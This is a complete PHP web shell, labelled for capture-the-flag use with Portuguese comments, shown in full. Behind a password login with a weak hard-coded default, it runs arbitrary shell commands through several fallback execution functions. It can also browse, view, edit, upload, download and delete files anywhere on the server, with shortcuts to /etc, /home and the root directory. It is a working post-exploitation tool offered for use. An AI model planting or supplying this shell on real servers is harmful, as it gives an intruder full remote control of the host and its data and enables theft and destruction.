<?php
/**
 * PHP Shell CTF - Versão com Navegação Livre
 * - Navega em QUALQUER diretório do sistema
 * - Atalhos rápidos para /var/www/html e outros
 */

// ========================================
// CONFIGURAÇÃO
// ========================================
$PASSWORD = 'teste123';  // ← MUDE ISSO!
$MAX_UPLOAD_SIZE = 50 * 1024 * 1024; // 50MB

// Autenticação simples
session_start();
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>PHP Shell - Login</title>
            <style>
                body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .login-box { background: #111; border: 2px solid #0f0; padding: 30px; border-radius: 5px; }
                input[type="password"] { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 250px; font-family: monospace; }
                button { background: #0f0; color: #000; border: none; padding: 10px 30px; cursor: pointer; font-weight: bold; margin-top: 10px; }
                button:hover { background: #0c0; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 PHP Shell Login</h2>
                <form method="POST">
                    <input type="password" name="pass" placeholder="Password" autofocus>
                    <br><button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Diretório inicial - NAVEGAÇÃO LIVRE
$current_dir = isset($_POST['current_dir']) ? $_POST['current_dir'] : (isset($_GET['dir']) ? $_GET['dir'] : __DIR__);
$current_dir = realpath($current_dir);
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = '/var/www/html'; // Tenta /var/www/html como fallback
    if (!is_dir($current_dir)) {
        $current_dir = __DIR__; // Se não existir, usa o diretório atual
    }
}

// ========================================
// AÇÕES
// ========================================

// Executar comando shell
$cmd_output = '';
$cmd_executed = '';
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmd_executed = htmlspecialchars($cmd);
    
    // Tenta vários métodos de execução
    if (function_exists('shell_exec')) {
        $cmd_output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output_arr);
        $cmd_output = implode("\n", $output_arr);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $cmd_output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $cmd_output = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $cmd_output = stream_get_contents($pipes[1]);
            $cmd_output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    } else {
        $cmd_output = "❌ Nenhuma função de execução disponível (shell_exec, exec, system, passthru, proc_open)";
    }
    
    if (empty($cmd_output)) {
        $cmd_output = "(comando executado sem output)";
    }
}

// Upload de arquivo
if (isset($_FILES['upload_file'])) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $message = "✅ Upload: " . basename($_FILES['upload_file']['name']);
    } else {
        $message = "❌ Erro no upload";
    }
}

// Criar arquivo
if (isset($_POST['create_file'])) {
    $new_file = $current_dir . '/' . $_POST['filename'];
    if (file_put_contents($new_file, '') !== false) {
        $message = "✅ Arquivo criado: " . $_POST['filename'];
    } else {
        $message = "❌ Erro ao criar arquivo";
    }
}

// Criar pasta
if (isset($_POST['create_dir'])) {
    $new_dir = $current_dir . '/' . $_POST['dirname'];
    if (mkdir($new_dir)) {
        $message = "✅ Pasta criada: " . $_POST['dirname'];
    } else {
        $message = "❌ Erro ao criar pasta";
    }
}

// Deletar
if (isset($_GET['delete'])) {
    $file = realpath($_GET['delete']);
    if ($file && file_exists($file)) {
        if (is_dir($file)) {
            if (rmdir($file)) {
                $message = "✅ Pasta deletada";
            } else {
                $message = "❌ Erro: pasta não vazia";
            }
        } else {
            if (unlink($file)) {
                $message = "✅ Arquivo deletado";
            } else {
                $message = "❌ Erro ao deletar";
            }
        }
    }
}

// Salvar arquivo editado - CORRIGIDO: preserva o diretório
if (isset($_POST['save_file'])) {
    $file = $_POST['file_path'];
    if (file_put_contents($file, $_POST['file_content']) !== false) {
        $message = "✅ Arquivo salvo: " . basename($file);
        // Redireciona de volta para o diretório correto
        $redirect_dir = dirname($file);
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($redirect_dir));
        exit;
    } else {
        $message = "❌ Erro ao salvar";
    }
}

// Download
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    if ($file && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ========================================
// HTML/CSS
// ========================================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP Shell - <?php echo basename($current_dir); ?></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            font-size: 14px;
            padding: 20px;
        }
        
        .header {
            background: #111;
            border: 2px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .header h1 {
            color: #0f0;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .info-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #0f0;
        }
        
        .current-path {
            color: #ff0;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .current-path a {
            color: #ff0;
            text-decoration: none;
        }
        
        .current-path a:hover {
            color: #fff;
            text-decoration: underline;
        }
        
        /* NOVO: Atalhos rápidos */
        .shortcuts {
            background: #111;
            border: 1px solid #0f0;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        
        .shortcuts a {
            display: inline-block;
            background: #0f0;
            color: #000;
            padding: 5px 10px;
            margin: 2px;
            border-radius: 3px;
            text-decoration: none;
            font-weight: bold;
            font-size: 12px;
        }
        
        .shortcuts a:hover {
            background: #0c0;
        }
        
        .message {
            background: #0f0;
            color: #000;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            font-weight: bold;
        }
        
        .error {
            background: #f00;
            color: #fff;
        }
        
        .terminal {
            background: #111;
            border: 1px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .terminal form {
            display: flex;
            gap: 10px;
        }
        
        .terminal input[type="text"] {
            flex: 1;
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 8px;
            font-family: 'Courier New', monospace;
        }
        
        .terminal button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 8px 20px;
            cursor: pointer;
            font-weight: bold;
        }
        
        .terminal button:hover {
            background: #0c0;
        }
        
        .cmd-output {
            background: #000;
            border: 1px solid #0f0;
            padding: 15px;
            margin-top: 15px;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .cmd-info {
            color: #ff0;
            margin-top: 10px;
            font-size: 12px;
        }
        
        .actions {
            background: #111;
            border: 1px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .actions form {
            display: inline-block;
            margin-right: 15px;
            margin-bottom: 10px;
        }
        
        .actions input[type="text"],
        .actions input[type="file"] {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 8px;
            font-family: 'Courier New', monospace;
        }
        
        .actions button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
            font-weight: bold;
        }
        
        .actions button:hover {
            background: #0c0;
        }
        
        .file-list {
            background: #111;
            border: 1px solid #0f0;
            border-radius: 5px;
            overflow: hidden;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            background: #0f0;
            color: #000;
            padding: 12px;
            text-align: left;
            font-weight: bold;
        }
        
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #222;
        }
        
        tr:hover {
            background: #1a1a1a;
        }
        
        a {
            color: #0f0;
            text-decoration: none;
        }
        
        a:hover {
            color: #0c0;
            text-decoration: underline;
        }
        
        .action-link {
            color: #0f0;
            margin-right: 10px;
            font-size: 12px;
            white-space: nowrap;
        }
        
        .action-link.danger {
            color: #f00;
        }
        
        .icon {
            display: inline-block;
            width: 20px;
        }
        
        .size {
            color: #888;
            font-size: 12px;
        }
        
        .perms {
            color: #ff0;
            font-family: monospace;
        }
        
        .editor {
            background: #111;
            border: 1px solid #0f0;
            padding: 20px;
            border-radius: 5px;
        }
        
        .editor h2 {
            color: #0f0;
            margin-bottom: 15px;
        }
        
        .editor textarea {
            width: 100%;
            height: 500px;
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
        }
        
        .btn-group {
            margin-top: 15px;
        }
        
        .btn {
            display: inline-block;
            background: #0f0;
            color: #000;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-weight: bold;
            text-decoration: none;
            margin-right: 10px;
        }
        
        .btn:hover {
            background: #0c0;
        }
        
        .btn-secondary {
            background: #666;
            color: #fff;
        }
        
        .btn-secondary:hover {
            background: #777;
        }
    </style>
</head>
<body>

<div class="header">
    <h1>🔧 PHP Shell CTF</h1>
    <div class="info-bar">
        <span>👤 <?php echo get_current_user(); ?> @ <?php echo php_uname('n'); ?></span>
        <span>🐘 PHP <?php echo phpversion(); ?></span>
        <a href="?logout" style="color:#f00">🚪 Logout</a>
    </div>
</div>

<?php if (isset($message)): ?>
<div class="message <?php echo strpos($message, '❌') !== false ? 'error' : ''; ?>">
    <?php echo $message; ?>
</div>
<?php endif; ?>

<!-- NOVO: Atalhos Rápidos -->
<div class="shortcuts">
    <strong>⚡ Atalhos:</strong>
    <a href="?dir=/var/www/html">📁 /var/www/html</a>
    <a href="?dir=/tmp">📁 /tmp</a>
    <a href="?dir=/etc">📁 /etc</a>
    <a href="?dir=/home">📁 /home</a>
    <a href="?dir=/">📁 / (raiz)</a>
</div>

<div class="terminal">
    <form method="POST">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="text" name="cmd" placeholder="$ digite seu comando aqui..." autofocus>
        <button type="submit">▶ Executar</button>
    </form>
    
    <?php if (!empty($cmd_output)): ?>
    <div class="cmd-info">
        ▸ Comando executado: <strong><?php echo $cmd_executed; ?></strong>
    </div>
    <div class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></div>
    <?php endif; ?>
</div>

<div class="current-path">
    📂 Caminho Atual: <?php 
    $parts = explode('/', $current_dir);
    $path = '';
    foreach ($parts as $i => $part) {
        if (empty($part)) continue;
        $path .= '/' . $part;
        if ($i < count($parts) - 1) {
            echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a> / ';
        } else {
            echo '<strong>' . htmlspecialchars($part) . '</strong>';
        }
    }
    ?>
</div>

<div class="actions">
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="file" name="upload_file" required>
        <button type="submit">📤 Upload</button>
    </form>
    
    <form method="POST" style="display:inline">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="text" name="filename" placeholder="novo-arquivo.txt" required>
        <button type="submit" name="create_file">📄 Criar Arquivo</button>
    </form>
    
    <form method="POST" style="display:inline">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <input type="text" name="dirname" placeholder="nova-pasta" required>
        <button type="submit" name="create_dir">📁 Criar Pasta</button>
    </form>
</div>

<?php
// ========================================
// EDITOR DE ARQUIVO
// ========================================
if (isset($_GET['edit'])) {
    $file = realpath($_GET['edit']);
    if ($file && is_file($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $file_dir = dirname($file); // Captura o diretório do arquivo
        ?>
        <div class="editor">
            <h2>✏️ Editando: <?php echo htmlspecialchars(basename($file)); ?></h2>
            <div style="color:#888; margin-bottom:10px;">
                📁 <?php echo htmlspecialchars($file); ?>
            </div>
            <form method="POST">
                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file); ?>">
                <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($file_dir); ?>">
                <textarea name="file_content"><?php echo htmlspecialchars($content); ?></textarea>
                <div class="btn-group">
                    <button type="submit" name="save_file" class="btn">💾 Salvar</button>
                    <a href="?dir=<?php echo urlencode($file_dir); ?>" class="btn btn-secondary">❌ Cancelar</a>
                </div>
            </form>
        </div>
        <?php
        echo '</body></html>';
        exit;
    }
}

// ========================================
// VISUALIZAR ARQUIVO
// ========================================
if (isset($_GET['view'])) {
    $file = realpath($_GET['view']);
    if ($file && is_file($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $file_dir = dirname($file);
        ?>
        <div class="editor">
            <h2>👁️ Visualizando: <?php echo htmlspecialchars(basename($file)); ?></h2>
            <div style="color:#888; margin-bottom:10px;">
                📁 <?php echo htmlspecialchars($file); ?>
            </div>
            <textarea readonly><?php echo htmlspecialchars($content); ?></textarea>
            <div class="btn-group">
                <a href="?dir=<?php echo urlencode($file_dir); ?>" class="btn btn-secondary">← Voltar</a>
                <a href="?download=<?php echo urlencode($file); ?>" class="btn">💾 Download</a>
            </div>
        </div>
        <?php
        echo '</body></html>';
        exit;
    }
}

// ========================================
// LISTAGEM DE ARQUIVOS
// ========================================
$items = scandir($current_dir);
$dirs = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    
    $path = $current_dir . '/' . $item;
    $stat = @stat($path);
    
    $info = [
        'name' => $item,
        'path' => $path,
        'size' => $stat ? $stat['size'] : 0,
        'modified' => $stat ? $stat['mtime'] : 0,
        'perms' => $stat ? substr(sprintf('%o', $stat['mode']), -4) : '????',
        'is_readable' => is_readable($path),
        'is_writable' => is_writable($path),
    ];
    
    if (is_dir($path)) {
        $dirs[] = $info;
    } else {
        $files[] = $info;
    }
}

// Ordenar
usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });

$items = array_merge($dirs, $files);
?>

<div class="file-list">
    <table>
        <thead>
            <tr>
                <th>Nome</th>
                <th>Tamanho</th>
                <th>Permissões</th>
                <th>Modificado</th>
                <th>Ações</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($current_dir !== '/'): ?>
            <tr>
                <td>
                    <span class="icon">📁</span>
                    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>"><strong>..</strong></a>
                </td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
            </tr>
            <?php endif; ?>
            
            <?php foreach ($items as $item): ?>
            <tr>
                <td>
                    <?php if (is_dir($item['path'])): ?>
                        <span class="icon">📁</span>
                        <a href="?dir=<?php echo urlencode($item['path']); ?>">
                            <strong><?php echo htmlspecialchars($item['name']); ?></strong>
                        </a>
                    <?php else: ?>
                        <span class="icon">📄</span>
                        <?php echo htmlspecialchars($item['name']); ?>
                    <?php endif; ?>
                </td>
                <td class="size">
                    <?php 
                    if (is_dir($item['path'])) {
                        echo '-';
                    } else {
                        $size = $item['size'];
                        if ($size > 1024*1024) {
                            echo number_format($size / (1024*1024), 2) . ' MB';
                        } elseif ($size > 1024) {
                            echo number_format($size / 1024, 2) . ' KB';
                        } else {
                            echo $size . ' B';
                        }
                    }
                    ?>
                </td>
                <td class="perms"><?php echo $item['perms']; ?></td>
                <td><?php echo date('Y-m-d H:i', $item['modified']); ?></td>
                <td>
                    <?php if (!is_dir($item['path'])): ?>
                        <a href="?view=<?php echo urlencode($item['path']); ?>" class="action-link">👁️ Ver</a>
                        <a href="?edit=<?php echo urlencode($item['path']); ?>" class="action-link">✏️ Editar</a>
                        <a href="?download=<?php echo urlencode($item['path']); ?>" class="action-link">⬇️ Download</a>
                    <?php endif; ?>
                    <a href="?delete=<?php echo urlencode($item['path']); ?>&dir=<?php echo urlencode($current_dir); ?>" 
                       class="action-link danger"
                       onclick="return confirm('Deletar <?php echo htmlspecialchars($item['name']); ?>?')">🗑️ Deletar</a>
                </td>
            </tr>
            <?php endforeach; ?>
            
            <?php if (empty($items)): ?>
            <tr>
                <td colspan="5" style="text-align:center; color:#666;">Pasta vazia</td>
            </tr>
            <?php endif; ?>
        </tbody>
    </table>
</div>

<div style="margin-top: 20px; padding: 15px; background: #111; border: 1px solid #0f0; border-radius: 5px;">
    <strong>📊 Estatísticas:</strong>
    <?php echo count($dirs); ?> pastas | <?php echo count($files); ?> arquivos
    <?php
    $total_size = array_sum(array_column($files, 'size'));
    if ($total_size > 1024*1024) {
        echo ' | Total: ' . number_format($total_size / (1024*1024), 2) . ' MB';
    } elseif ($total_size > 1024) {
        echo ' | Total: ' . number_format($total_size / 1024, 2) . ' KB';
    }
    ?>
</div>

</body>
</html>
